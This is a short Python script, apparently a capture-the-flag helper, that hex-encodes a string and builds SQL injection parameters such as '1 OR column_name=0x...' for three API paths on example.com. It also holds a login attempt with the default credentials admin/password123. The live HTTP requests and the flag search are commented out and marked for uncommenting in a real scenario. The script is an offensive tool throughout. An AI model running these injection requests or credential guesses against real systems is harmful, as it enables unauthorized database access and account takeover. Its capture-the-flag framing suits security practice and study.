import requests

TARGET_STR = 'front-end'
BASE_URL = "http://example.com"
PATHS = ["/api/login", "/api/search", "/api/user"]
AUTH_DATA = {"username": "admin", "password": "password123"}

def str_to_sqli_hex(s):
    return "0x" + s.encode('utf-8').hex()

def main():
    hex_payload = str_to_sqli_hex(TARGET_STR)
    print(f"[*] Original String: {TARGET_STR}")
    print(f"[*] SQL Injection Hex Payload: {hex_payload}")

    session = requests.Session()

    try:
        print(f"[*] Attempting authentication at {BASE_URL}...")
        # auth_resp = session.post(f"{BASE_URL}/login", data=AUTH_DATA, timeout=5)
        # if auth_resp.status_code == 200:
        #     print("[+] Authentication successful, session cookies maintained.")
        # else:
        #     print("[-] Authentication failed.")
        print("[*] Authentication step simulated (uncomment in real scenario).")
    except requests.RequestException as e:
        print(f"[-] Authentication request failed: {e}")
        return

    print(f"[*] Iterating through paths with hex payload...")
    for path in PATHS:
        target_url = f"{BASE_URL}{path}"
        sqli_params = {
            "id": f"1 OR column_name={hex_payload}",
            "role": hex_payload
        }
        
        try:
            print(f"[*] Target: {target_url} | Params: {sqli_params}")
            # resp = session.get(target_url, params=sqli_params, timeout=5)
            # print(f"[*] Response Status: {resp.status_code} | Length: {len(resp.text)}")
            # if "flag{" in resp.text or "CTF{" in resp.text:
            #     print(f"[+] Found Flag in response from {target_url}!")
            #     print(resp.text)
        except requests.RequestException as e:
            print(f"[-] Request to {target_url} failed: {e}")

if __name__ == "__main__":
    main()